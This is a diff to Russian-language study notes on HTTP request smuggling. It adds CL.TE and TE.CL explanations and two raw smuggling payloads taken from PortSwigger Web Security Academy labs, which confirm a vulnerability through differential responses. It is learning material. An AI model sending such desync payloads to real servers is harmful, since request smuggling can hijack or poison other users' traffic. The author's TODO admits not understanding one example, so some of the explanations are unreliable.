@@ -184,7 +184,7 @@ GET /404 HTTP/1.1
 Foo: x
 ```
 
-Суть в том, что на стороне фронтенд сервера, этот запрос пересобирается в:
+Суть в том, что на стороне бэкенд сервер, будет рассматривать этот запрос как:
 
 ```
 GET /404 HTTP/1.1
@@ -196,7 +196,24 @@ Content-Length: 11
 q=smuggling
 ```
 
-и отправляется на бэк. Если получим 404, сервер уязвим к этому типу атаки
+Если получим 404, сервер уязвим к этому типу атаки
+
+Еще пример из [лабы](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses):
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+
+TODO: почему это так работает — хз. Надо поднимать свою лабу и дебажить..
 
 #### TE.CL
 
@@ -219,7 +236,7 @@ x=
 
 ```
 
-Если атака успешна, то на стороне фронтенд сервера запрос пересоберется в:
+Если атака успешна, то на стороне бэкенд-сервера запрос пересоберется в:
 
 ```
 GET /404 HTTP/1.1
@@ -238,7 +255,27 @@ Content-Length: 11
 q=smuggling
 ```
 
-и так отправится на сторону бэкенд-сервера -> если получим 404 — сервер уязвим к этому типу атаки
+Если получим 404 — сервер уязвим к этому типу атаки
+
+Пример запроса:
+
+```
+POST /search HTTP/1.1
+Host: 0a3f0008040cb821c064af6f00200096.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
 
 ### Notes
 
